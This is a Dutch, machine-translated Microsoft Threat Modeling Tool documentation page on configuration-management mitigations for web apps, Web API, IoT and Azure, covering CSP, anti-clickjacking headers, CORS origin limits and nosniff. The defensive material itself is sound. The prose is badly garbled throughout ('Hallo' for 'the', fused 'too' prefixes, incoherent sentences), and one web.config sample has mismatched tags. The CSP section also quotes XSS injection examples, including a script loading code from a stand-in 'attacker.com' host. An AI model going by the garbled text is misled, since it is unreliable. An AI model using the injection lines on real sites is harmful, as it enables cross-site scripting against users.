---
title: aaaConfiguration Azure Management - Microsoft Threat Modeling Tool - | Microsoft Docs
description: oplossingen voor bedreigingen die worden weergegeven in Hallo Threat Modeling hulpprogramma
services: security
documentationcenter: na
author: RodSan
manager: RodSan
editor: RodSan
ms.assetid: na
ms.service: security
ms.workload: na
ms.tgt_pltfrm: na
ms.devlang: na
ms.topic: article
ms.date: 08/17/2017
ms.author: rodsan
ms.openlocfilehash: 77aa4352fa61e928a1b7a4ff1d488a55d3d9b970
ms.sourcegitcommit: 523283cc1b3c37c428e77850964dc1c33742c5f0
ms.translationtype: MT
ms.contentlocale: nl-NL
ms.lasthandoff: 10/06/2017
---
# <a name="security-frame-configuration-management--mitigations"></a>Beveiliging Frame: Configuratiebeheer | Oplossingen 
| Product/Service | Artikel |
| --------------- | ------- |
| **Webtoepassing** | <ul><li>[Implementeren van inhoud Security-beleid (CSP) en inline javascript uitschakelen](#csp-js)</li><li>[Inschakelen van de browser XSS-filter](#xss-filter)</li><li>[ASP.NET-toepassingen moeten tracering en foutopsporing van eerdere toodeployment uitschakelen](#trace-deploy)</li><li>[Toegang van derden JavaScript van alleen vertrouwde bronnen](#js-trusted)</li><li>[Zorg ervoor dat de geverifieerde ASP.NET-pagina's UI Redressing of klik-steunpunten voor beveiliging opneemt](#ui-defenses)</li><li>[Zorg ervoor dat alleen vertrouwde oorsprongen zijn toegestaan als CORS is ingeschakeld op de ASP.NET-webtoepassingen](#cors-aspnet)</li><li>[ValidateRequest kenmerk voor ASP.NET-pagina's inschakelen](#validate-aspnet)</li><li>[Meest recente versies van JavaScript-bibliotheken lokaal gehost gebruiken](#local-js)</li><li>[Automatische MIME-controle uitschakelen](#mime-sniff)</li><li>[Standard van SQL server-headers van de Windows Azure-websites tooavoid fingerprinting verwijderen](#standard-finger)</li></ul> |
| **Database** | <ul><li>[Een Windows Firewall configureren voor toegang tot de Database-Engine](#firewall-db)</li></ul> |
| **Web-API** | <ul><li>[Zorg ervoor dat alleen vertrouwde oorsprongen zijn toegestaan als op ASP.NET Web API CORS is ingeschakeld](#cors-api)</li><li>[Secties van Web-API-configuratiebestanden met gevoelige gegevens versleutelen](#config-sensitive)</li></ul> |
| **IoT-apparaat** | <ul><li>[Zorg ervoor dat alle admin-interfaces zijn beveiligd met sterke referenties](#admin-strong)</li><li>[Zorg ervoor dat onbekende code kan niet worden uitgevoerd op apparaten](#unknown-exe)</li><li>[Besturingssysteem en de extra partities van IoT-apparaat met BitLocker coderen](#partition-iot)</li><li>[Zorg ervoor dat alleen Hallo minimale services en-functies zijn ingeschakeld op apparaten](#min-enable)</li></ul> |
| **Veld IoT Gateway** | <ul><li>[Besturingssysteem en de extra partities van IoT-Veldgateway met BitLocker coderen](#field-bit-locker)</li><li>[Zorg dat Hallo standaard aanmeldingsreferenties van Hallo veldgateway zijn gewijzigd tijdens de installatie](#default-change)</li></ul> |
| **IoT-Cloudgateway** | <ul><li>[Zorg ervoor dat Hallo Cloudgateway implementeert een proces tookeep Hallo verbonden apparaten firmware up toodate](#cloud-firmware)</li></ul> |
| **Een grens machine vertrouwensrelatie** | <ul><li>[Zorg ervoor dat apparaten beveiligingsmechanismen eindpunt geconfigureerd volgens het organisatiebeleid](#controls-policies)</li></ul> |
| **Azure Storage** | <ul><li>[Zorg ervoor dat veilig beheer van Azure opslagtoegangssleutels](#secure-keys)</li><li>[Zorg ervoor dat alleen vertrouwde oorsprongen zijn toegestaan als CORS is ingeschakeld op de Azure-opslag](#cors-storage)</li></ul> |
| **WCF** | <ul><li>[Functie beperking van WCF-service inschakelen](#throttling)</li><li>[WCF-openbaarmaking via metagegevens](#info-metadata)</li></ul> | 

## <a id="csp-js"></a>Implementeren van inhoud Security-beleid (CSP) en inline javascript uitschakelen

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Webtoepassing | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N.v.t.  |
| **Verwijzingen**              | [Een inleiding tooContent beveiligingsbeleid](http://www.html5rocks.com/en/tutorials/security/content-security-policy/), [inhoud Security Policy Reference](http://content-security-policy.com/), [beveiligingsfuncties](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [inleiding toocontent beveiligingsbeleid](https://docs.webplatform.org/wiki/tutorials/content-security-policy), [Kan ik de CSP gebruiken?](http://caniuse.com/#feat=contentsecuritypolicy) |
| **Stappen** | <p>Inhoud Security-beleid (CSP) is een defense-in-depth beveiligingsmechanisme, een W3C standard, waarmee de toepassing eigenaars toohave webbesturingselement op Hallo inhoud die is ingesloten in hun site. CSP wordt toegevoegd als een HTTP-antwoordheader op Hallo-webserver en door browsers aan clientzijde hello wordt afgedwongen. Er is een beleid op basis van een lijst met geaccepteerde - een website kunt een set van vertrouwde domeinen uit welke actieve inhoud declareren, zoals JavaScript, kan worden geladen.</p><p>CSP biedt Hallo volgende beveiligingsvoordelen:</p><ul><li>**Bescherming tegen XSS:** als een pagina kwetsbaar tooXSS is, kunt u deze in een aanvaller kan misbruiken op 2 manieren:<ul><li>Injecteren `<script>malicious code</script>`. Hiervoor werkt niet vanwege tooCSP van Base beperking-1</li><li>Injecteren `<script src=”http://attacker.com/maliciousCode.js”/>`. Hiervoor werkt niet omdat Hallo aanvaller beheerd domein niet voorkomt in goedgekeurde lijst van de CSP-domeinen</li></ul></li><li>**Controle over de gegevens exfiltration:** als schadelijke inhoud op een webpagina tooconnect tooan externe website en de gegevens stelen probeert, Hallo verbinding wordt verbroken door de CSP. Dit is omdat het doeldomein Hallo niet voorkomt in goedgekeurde lijst van de CSP</li><li>**Beveiliging tegen steunpunten voor van Klik:** steunpunten voor van Klik is een techniek aanval met die een adversary kunt frame een legitieme website en gebruikers tooclick afdwingen op UI-elementen. Beveiliging tegen steunpunten voor van Klik wordt momenteel bereikt door een antwoord-header X-Frame-opties configureren. Niet alle browsers respecteren deze header en een normale manier toodefend tegen steunpunten voor van Klik forward CSP gaan worden</li><li>**Realtime-aanval reporting:** als er een ingebracht bij een aanval op een website CSP is ingeschakeld, browsers tooan meldingseindpunt geconfigureerd op de webserver Hallo automatisch geactiveerd. Op deze manier CSP fungeert als een realtime waarschuwingssysteem.</li></ul> |

### <a name="example"></a>Voorbeeld
Van voorbeeldbeleid: 
```C#
Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
```
Dit beleid kunt scripts tooload alleen vanaf de server en de google analytics server Hallo-webtoepassing. Scripts die worden geladen vanuit een andere site wordt geweigerd. Wanneer de CSP is ingeschakeld op een website, hello volgende functies zijn automatisch uitgeschakelde toomitigate XSS-aanvallen. 

### <a name="example"></a>Voorbeeld
Inline-scripts worden niet uitgevoerd. Hieronder vindt u voorbeelden van inline-scripts 
```javascript
<script> some Javascript code </script>
Event handling attributes of HTML tags (e.g., <button onclick=”function(){}”>
javascript:alert(1);
```

### <a name="example"></a>Voorbeeld
Tekenreeksen wordt niet geëvalueerd als code. 
```javascript
Example: var str="alert(1)"; eval(str);
```

## <a id="xss-filter"></a>Inschakelen van de browser XSS-filter

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Webtoepassing | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N.v.t.  |
| **Verwijzingen**              | [Beveiliging-XSS-Filter](https://www.owasp.org/index.php/List_of_useful_HTTP_headers#X-XSS-Protection) |
| **Stappen** | <p>Besturingselementen voor header configuratie X XSS beveiliging antwoord Hallo van de browser cross-site script filter. Deze antwoordheader kan het volgende waarden hebben:</p><ul><li>`0:`Hiermee wordt het filter Hallo uitgeschakeld</li><li>`1: Filter enabled`Als een cross-site scripting-aanval wordt gedetecteerd, in volgorde toostop Hallo aanval opschonen Hallo browser van Hallo pagina</li><li>`1: mode=block : Filter enabled`. In plaats van het opschonen van Hallo pagina wanneer een XSS-aanval wordt gedetecteerd, Hallo browser te voorkomen dat rendering van Hallo pagina</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. Hallo-browser wordt Hallo pagina en in het rapport Hallo schending opschonen.</li></ul><p>Dit is een chroom-functie met behulp van de CSP schending rapporten toosend details tooa URI van uw keuze. Hallo afgelopen 2 opties worden beschouwd als veilige waarden.</p>|

## <a id="trace-deploy"></a>ASP.NET-toepassingen moeten tracering en foutopsporing van eerdere toodeployment uitschakelen

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Webtoepassing | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N.v.t.  |
| **Verwijzingen**              | [ASP.NET-foutopsporing overzicht](http://msdn2.microsoft.com/library/ms227556.aspx), [ASP.NET tracering overzicht](http://msdn2.microsoft.com/library/bb386420.aspx), [hoe: tracering inschakelen voor een ASP.NET-toepassing](http://msdn2.microsoft.com/library/0x5wc973.aspx), [hoe: foutopsporing voor ASP.NET-toepassingen inschakelen](http://msdn2.microsoft.com/library/e8z01xdh(VS.80).aspx) |
| **Stappen** | Wanneer tracering is ingeschakeld voor de pagina hello, krijgt elke browser ook aanvragen Hallo traceringsinformatie die gegevens over de werkstroom en de status van de interne server bevat. Deze informatie wordt mogelijk invloed op de beveiliging. Wanneer foutopsporing is ingeschakeld voor de pagina hello, gepresenteerd fouten op Hallo server resultaat in de gegevens van een volledige stack trace plaatsvinden toohello browser. Deze gegevens kan blootstellen vertrouwelijke informatie over werkstroom Hallo-server. |

## <a id="js-trusted"></a>Toegang van derden JavaScript van alleen vertrouwde bronnen

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Webtoepassing | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N.v.t.  |
| **Verwijzingen**              | N.v.t.  |
| **Stappen** | JavaScript van derden moet alleen van betrouwbare bronnen worden verwezen. Hallo verwijzing eindpunten moet altijd over SSL. |

## <a id="ui-defenses"></a>Zorg ervoor dat de geverifieerde ASP.NET-pagina's UI Redressing of klik-steunpunten voor beveiliging opneemt

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Webtoepassing | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N.v.t.  |
| **Verwijzingen**              | [Klik-steunpunten voor verdediging cheats blad OWASP](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet), [interne werking van IE - bestrijding steunpunten voor van Klik met de X-Frame-opties](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-click-jacking-with-x-frame-options/) |
| **Stappen** | <p>steunpunten klikken voor, ook wel bekend als een 'UI rechtsmiddelen aanval', is wanneer een aanvaller gebruikmaakt van meerdere lagen transparant of ondoorzichtig tootrick een gebruiker in op een knop of een koppeling te klikken op een andere pagina wanneer ze tooclick op het hoogste niveau Hallo-pagina wilde zijn.</p><p>Deze gelaagdheid wordt bereikt door een schadelijke pagina met een iframe die van het slachtoffer Hallo pagina wordt geladen. Dus Hallo aanvaller 'kaapt' klikt op zijn alleen bedoeld voor de pagina en routering ze tooanother pagina waarschijnlijk het eigendom is van een andere toepassing, domein, of beide. tooprevent steunpunten klik is voor aanvallen set Hallo juiste X-Frame-opties voor HTTP-antwoordheaders die Hallo browser toonot instrueren toestaan framing uit andere domeinen</p>|

### <a name="example"></a>Voorbeeld
Hallo X-FRAME-opties voor header kan worden ingesteld via IIS web.config. Codefragment web.config voor sites die nooit moeten worden opgesteld: 
```C#
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="DENY"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

### <a name="example"></a>Voorbeeld
Code voor sites die alleen moeten worden opgesteld door web.config-pagina's in Hallo dezelfde domein: 
```C#
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="SAMEORIGIN"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

## <a id="cors-aspnet"></a>Zorg ervoor dat alleen vertrouwde oorsprongen zijn toegestaan als CORS is ingeschakeld op de ASP.NET-webtoepassingen

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Webtoepassing | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | Webformulieren, MVC5 |
| **Kenmerken**              | N.v.t.  |
| **Verwijzingen**              | N.v.t.  |
| **Stappen** | <p>Browserbeveiliging wordt voorkomen dat een webpagina AJAX-aanvragen tooanother domein aanbrengen. Deze beperking Hallo dezelfde oorsprong beleid heet, en een schadelijke site wordt voorkomen dat gevoelige gegevens leest uit een andere site. Echter, soms mogelijk vereist tooexpose API's veilig die andere sites kunnen gebruiken. Cross-Origin-Resource delen (CORS) is een W3C-standaard waarmee een server toorelax Hallo dezelfde oorsprong beleid. Met behulp van CORS, kunt een server expliciet kunnen sommige cross-origin-aanvragen terwijl anderen weigeren.</p><p>CORS is veiliger en flexibeler dan eerdere technieken zoals JSONP. De kern inschakelen van CORS vertaalt tooadding enkele HTTP-antwoordheaders (Access - Control-*) toohello webtoepassing en dit kunnen worden uitgevoerd in een aantal manieren.</p>|

### <a name="example"></a>Voorbeeld
Toegang tooWeb.config beschikbaar is, kunnen CORS worden toegevoegd via Hallo code te volgen: 
```XML
<system.webServer>
    <httpProtocol>
      <customHeaders>
        <clear />
        <add name="Access-Control-Allow-Origin" value="http://example.com" />
      </customHeaders>
    </httpProtocol>
```

### <a name="example"></a>Voorbeeld
Toegang tooweb.config niet beschikbaar is, kunnen CORS worden geconfigureerd door toe te voegen Hallo CSharp code te volgen: 
```C#
HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "http://example.com")
```

Stel van Let erop dat het is essentieel tooensure die lijst met oorsprongen in het kenmerk 'Access Control-toestaan-oorsprong' Hallo tooa eindig en vertrouwde set oorsprongen. Dit verkeerd tooconfigure mislukt (bijvoorbeeld als Hallo-waarde als ' *') kan schadelijke websites tootrigger cross-origin-aanvragen toohello webtoepassing > zonder beperkingen, waardoor de Hallo toepassing kwetsbaar tooCSRF aanvallen. 

## <a id="validate-aspnet"></a>ValidateRequest kenmerk voor ASP.NET-pagina's inschakelen

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Webtoepassing | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | Webformulieren, MVC5 |
| **Kenmerken**              | N.v.t.  |
| **Verwijzingen**              | [Validatie - Script aanvallen aanvragen](http://www.asp.net/whitepapers/request-validation) |
| **Stappen** | <p>Aanvraag valideren, een functie van ASP.NET sinds versie 1.1, voorkomt u dat de server Hallo HTML van inhoud met niet-gecodeerde accepteren. Deze functie is ontworpen toohelp te voorkomen dat een aantal script-injectieaanvallen waarbij scriptcode client of HTML onbewust ingediende tooa server opgeslagen en vervolgens gepresenteerd tooother gebruikers kan zijn. Nog steeds wordt aangeraden dat u alle invoergegevens valideren en HTML coderen deze indien nodig.</p><p>Aanvraagvalidatie is uitgevoerd door alle invoergegevens tooa lijst met mogelijk schadelijke waarden te vergelijken. Als er een overeenkomst optreedt, wordt ASP.NET gegeven een `HttpRequestValidationException`. Aanvragen validatiefunctie is standaard ingeschakeld.</p>|

### <a name="example"></a>Voorbeeld
Deze functie kan echter worden uitgeschakeld op het paginaniveau van de: 
```XML
<%@ Page validateRequest="false" %> 
```
of op toepassingsniveau 
```XML
<configuration>
   <system.web>
      <pages validateRequest="false" />
   </system.web>
</configuration>
```
Houd er rekening mee dat aanvragen validatiefunctie wordt niet ondersteund en maakt geen deel uit van MVC6 pijplijn. 

## <a id="local-js"></a>Meest recente versies van JavaScript-bibliotheken lokaal gehost gebruiken

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Webtoepassing | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N.v.t.  |
| **Verwijzingen**              | N.v.t.  |
| **Stappen** | <p>Ontwikkelaars JavaScript standaardbibliotheken zoals JQuery moet gebruiken met goedgekeurde versies van algemene JavaScript-bibliotheken die geen bekende beveiligingsfouten bevatten. Een goede gewoonte is toouse Hallo meest recente versie van Hallo-bibliotheken, omdat ze oplossingen voor bekende beveiligingslekken in hun oudere versies bevatten.</p><p>Als de meest recente release Hallo kan niet worden gebruikt vanwege toocompatibility redenen, moet Hallo lager dan de minimaal vereiste versies worden gebruikt.</p><p>Acceptabele minimaal vereiste versies:</p><ul><li>**JQuery**<ul><li>JQuery 1.7.1</li><li>JQueryUI 1.10.0</li><li>JQuery 1,9 valideren</li><li>JQuery Mobile 1.0.1</li><li>JQuery cyclus 2.99</li><li>JQuery DataTables 1.9.0</li></ul></li><li>**Toolkit voor AJAX-besturingselement**<ul><li>AJAX-besturingselement Toolkit 40412</li></ul></li><li>**ASP.NET-webformulieren en Ajax**<ul><li>ASP.NET-webformulieren en Ajax 4</li><li>ASP.NET Ajax 3.5</li></ul></li><li>**ASP.NET MVC**<ul><li>ASP.NET MVC 3.0</li></ul></li></ul><p>Nooit een JavaScript-bibliotheek niet laden van externe sites zoals openbare CDN</p>|

## <a id="mime-sniff"></a>Automatische MIME-controle uitschakelen

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Webtoepassing | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N.v.t.  |
| **Verwijzingen**              | [IE8 beveiliging deel V: uitgebreide beveiliging](http://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx), [MIME-type](http://en.wikipedia.org/wiki/Mime_type) |
| **Stappen** | Hallo X-inhoud--opties voor het Type-header is een HTTP-header waarmee ontwikkelaars toospecify dat zijn inhoud mag geen MIME-sniff. Deze header is ontworpen toomitigate bekijken van MIME-aanvallen. Voor elke pagina die gebruiker instelbare inhoud kan bevatten, moet u Hallo HTTP-Header X-inhoud-Type-opties: nosniff. tooenable hello vereiste header globaal voor alle pagina's in de toepassing hello, u een van de volgende Hallo kunt doen|

### <a name="example"></a>Voorbeeld
Hallo-header in Hallo web.config-bestand toevoegen als Hallo-toepassing wordt gehost door Internet Information Services (IIS) 7 of hoger. 
```XML
<system.webServer>
<httpProtocol>
<customHeaders>
<add name="X-Content-Type-Options" value="nosniff"/>
</customHeaders>
</httpProtocol>
</system.webServer>
```

### <a name="example"></a>Voorbeeld
Hallo-header via Hallo toevoegen globale toepassing\_BeginRequest 
```C#
void Application_BeginRequest(object sender, EventArgs e)
{
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
}
```

### <a name="example"></a>Voorbeeld
Aangepaste HTTP-module implementeren 
```C#
public class XContentTypeOptionsModule : IHttpModule
{
#region IHttpModule Members
public void Dispose()
{
}
public void Init(HttpApplication context)
{
context.PreSendRequestHeaders += newEventHandler(context_PreSendRequestHeaders);
}
#endregion
void context_PreSendRequestHeaders(object sender, EventArgs e)
{
HttpApplication application = sender as HttpApplication;
if (application == null)
  return;
if (application.Response.Headers["X-Content-Type-Options "] != null)
  return;
application.Response.Headers.Add("X-Content-Type-Options ", "nosniff");
}
}
```

### <a name="example"></a>Voorbeeld
Door deze toe te voegen tooindividual reacties kunt u de vereiste header Hallo alleen voor specifieke's inschakelen: 

```C#
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
```

## <a id="standard-finger"></a>Standard van SQL server-headers van de Windows Azure-websites tooavoid fingerprinting verwijderen

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Webtoepassing | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | EnvironmentType - Azure |
| **Verwijzingen**              | [Standard van SQL server-koppen op Windows Azure-websites worden verwijderd](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/) |
| **Stappen** | Headers zoals Server X-ingeschakeld-door X-AspNet-Version onthullen informatie over het Hallo-server en Hallo onderliggende technologieën. Het verdient aanbeveling toosuppress deze koppen waardoor fingerprinting Hallo toepassing |

## <a id="firewall-db"></a>Een Windows Firewall configureren voor toegang tot de Database-Engine

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Database | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | SQL Azure, OnPrem |
| **Kenmerken**              | N.V.T., SQL-versie - V12 |
| **Verwijzingen**              | [Hoe tooconfigure een Azure SQL database-firewall](https://azure.microsoft.com/documentation/articles/sql-database-firewall-configure/), [Windows Firewall configureren voor toegang tot de Database-Engine](https://msdn.microsoft.com/library/ms175043) |
| **Stappen** | Firewall-systemen te voorkomen dat onbevoegde toegang tot toocomputer bronnen. tooaccess een exemplaar van SQL Server Database Engine Hallo via een firewall, moet u Hallo firewall configureren op Hallo-computer waarop SQL Server tooallow access |

## <a id="cors-api"></a>Zorg ervoor dat alleen vertrouwde oorsprongen zijn toegestaan als op ASP.NET Web API CORS is ingeschakeld

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Web-API | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | MVC 5 |
| **Kenmerken**              | N.v.t.  |
| **Verwijzingen**              | [Inschakelen van Cross-Origin-aanvragen in ASP.NET Web API 2](http://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api), [ASP.NET Web API - CORS-ondersteuning in ASP.NET Web API 2](https://msdn.microsoft.com/magazine/dn532203.aspx) |
| **Stappen** | <p>Browserbeveiliging wordt voorkomen dat een webpagina AJAX-aanvragen tooanother domein aanbrengen. Deze beperking Hallo dezelfde oorsprong beleid heet, en een schadelijke site wordt voorkomen dat gevoelige gegevens leest uit een andere site. Echter, soms mogelijk vereist tooexpose API's veilig die andere sites kunnen gebruiken. Cross-Origin-Resource delen (CORS) is een W3C-standaard waarmee een server toorelax Hallo dezelfde oorsprong beleid.</p><p>Met behulp van CORS, kunt een server expliciet kunnen sommige cross-origin-aanvragen terwijl anderen weigeren. CORS is veiliger en flexibeler dan eerdere technieken zoals JSONP.</p>|

### <a name="example"></a>Voorbeeld
Voeg in Hallo App_Start/WebApiConfig.cs, Hallo volgende code toohello WebApiConfig.Register methode 
```C#
using System.Web.Http;
namespace WebService
{
    public static class WebApiConfig
    {
        public static void Register(HttpConfiguration config)
        {
            // New code
            config.EnableCors();

            config.Routes.MapHttpRoute(
                name: "DefaultApi",
                routeTemplate: "api/{controller}/{id}",
                defaults: new { id = RouteParameter.Optional }
            );
        }
    }
}
```

### <a name="example"></a>Voorbeeld
EnableCors-kenmerk kan worden toegepast tooaction methoden in een domeincontroller als volgt: 

```C#
public class ResourcesController : ApiController
{
  [EnableCors("http://localhost:55912", // Origin
              null,                     // Request headers
              "GET",                    // HTTP methods
              "bar",                    // Response headers
              SupportsCredentials=true  // Allow credentials
  )]
  public HttpResponseMessage Get(int id)
  {
    var resp = Request.CreateResponse(HttpStatusCode.NoContent);
    resp.Headers.Add("bar", "a bar value");
    return resp;
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "PUT",                          // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "POST",                         // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
}
```

Stel van Let erop dat het is essentieel tooensure die lijst met oorsprongen in EnableCors kenmerk Hallo tooa eindig en vertrouwde set oorsprongen. Dit verkeerd tooconfigure mislukt (bijvoorbeeld instelling Hallo-waarde als ' *') kan schadelijke websites tootrigger cross-origin-aanvragen toohello API zonder beperkingen, > waardoor Hallo API kwetsbaar tooCSRF aanvallen. EnableCors kunt gedecoreerd worden op het niveau van de domeincontroller. 

### <a name="example"></a>Voorbeeld
toodisable CORS voor een bepaalde methode in een klasse, Hallo DisableCors-kenmerk kan worden gebruikt, zoals hieronder wordt weergegeven: 
```C#
[EnableCors("http://example.com", "Accept, Origin, Content-Type", "POST")]
public class ResourcesController : ApiController
{
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  // CORS not allowed because of hello [DisableCors] attribute
  [DisableCors]
  public HttpResponseMessage Delete(int id)
  {
    return Request.CreateResponse(HttpStatusCode.NoContent);
  }
}
```

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Web-API | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | MVC 6 |
| **Kenmerken**              | N.v.t.  |
| **Verwijzingen**              | [Cross-Origin-aanvragen (CORS) in ASP.NET Core 1.0 inschakelen](https://docs.asp.net/en/latest/security/cors.html) |
| **Stappen** | <p>In ASP.NET Core 1.0 kan CORS worden ingeschakeld met behulp van middleware of met behulp van MVC. Als u MVC tooenable CORS Hallo dezelfde CORS-services worden gebruikt, maar Hallo CORS middleware niet is.</p>|

**Methode 1** inschakelen van CORS met middleware: tooenable CORS voor de gehele toepassing hello Hallo CORS middleware toohello-aanvraag voor pipeline met Hallo UseCors uitbreidingsmethode toevoegen. Een cross-origin-beleid kan worden opgegeven bij het toevoegen van Hallo CORS middleware Hallo CorsPolicyBuilder klasse gebruiken. Er zijn twee manieren toodo dit:

### <a name="example"></a>Voorbeeld
Hallo is eerst toocall UseCors met een lambda. Hallo lambda wordt een CorsPolicyBuilder-object: 
```C#
public void Configure(IApplicationBuilder app)
{
    app.UseCors(builder =>
        builder.WithOrigins("http://example.com")
        .WithMethods("GET", "POST", "HEAD")
        .WithHeaders("accept", "content-type", "origin", "x-custom-header"));
}
```

### <a name="example"></a>Voorbeeld
Hallo is het tweede toodefine een of meer met de naam CORS-beleid en selecteer vervolgens Hallo beleid met de naam tijdens runtime. 
```C#
public void ConfigureServices(IServiceCollection services)
{
    services.AddCors(options =>
    {
        options.AddPolicy("AllowSpecificOrigin",
            builder => builder.WithOrigins("http://example.com"));
    });
}
public void Configure(IApplicationBuilder app)
{
    app.UseCors("AllowSpecificOrigin");
    app.Run(async (context) =>
    {
        await context.Response.WriteAsync("Hello World!");
    });
}
```

**Methode 2** CORS inschakelen in MVC: ontwikkelaars kunnen ook gebruikmaken van MVC-tooapply specifieke CORS per actie, per controller, maar ook voor alle domeincontrollers.

### <a name="example"></a>Voorbeeld
Per actie: toospecify een CORS-beleid voor een specifieke actie Hallo [EnableCors] kenmerk toohello actie toevoegen. Hallo beleidsnaam opgeven. 
```C#
public class HomeController : Controller
{
    [EnableCors("AllowSpecificOrigin")] 
    public IActionResult Index()
    {
        return View();
    }
```

### <a name="example"></a>Voorbeeld
Per domeincontroller: 
```C#
[EnableCors("AllowSpecificOrigin")]
public class HomeController : Controller
{
```

### <a name="example"></a>Voorbeeld
Globaal: 
```C#
public void ConfigureServices(IServiceCollection services)
{
    services.AddMvc();
    services.Configure<MvcOptions>(options =>
    {
        options.Filters.Add(new CorsAuthorizationFilterFactory("AllowSpecificOrigin"));
    });
}
```
Stel van Let erop dat het is essentieel tooensure die lijst met oorsprongen in EnableCors kenmerk Hallo tooa eindig en vertrouwde set oorsprongen. Dit verkeerd tooconfigure mislukt (bijvoorbeeld instelling Hallo-waarde als ' *') kan schadelijke websites tootrigger cross-origin-aanvragen toohello API zonder beperkingen, > waardoor Hallo API kwetsbaar tooCSRF aanvallen. 

### <a name="example"></a>Voorbeeld
toodisable CORS voor een domeincontroller of de actie, gebruik Hallo [DisableCors]-kenmerk. 
```C#
[DisableCors]
    public IActionResult About()
    {
        return View();
    }
```

## <a id="config-sensitive"></a>Secties van Web-API-configuratiebestanden met gevoelige gegevens versleutelen

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Web-API | 
| **SDL-fase**               | Implementatie |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N.v.t.  |
| **Verwijzingen**              | [Procedure: Coderen configuratiesecties in ASP.NET 2.0 met behulp van DPAPI](https://msdn.microsoft.com/library/ff647398.aspx), [geven een Configuratieprovider beveiligd](https://msdn.microsoft.com/library/68ze1hb2.aspx), [met behulp van Azure Sleutelkluis tooprotect toepassing geheimen](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) |
| **Stappen** | Configuratiebestanden zoals Hallo Web.config, appsettings.json zijn vaak toohold gevoelige gegevens, zoals gebruikersnamen, wachtwoorden, databaseverbindingsreeksen en versleutelingssleutels gebruikt. Als u deze informatie niet beveiligt, wordt de toepassing is kwetsbaar tooattackers of kwaadwillende gebruikers het verkrijgen van gevoelige informatie zoals gebruikersnamen en wachtwoorden, databasenamen en servernamen. Op basis van het implementatietype hello (azure/on-premises), versleutelen Hallo gevoelige secties van configuratiebestanden met DPAPI of services zoals Azure Sleutelkluis. |

## <a id="admin-strong"></a>Zorg ervoor dat alle admin-interfaces zijn beveiligd met sterke referenties

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | IoT-apparaat | 
| **SDL-fase**               | Implementatie |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N.v.t.  |
| **Verwijzingen**              | N.v.t.  |
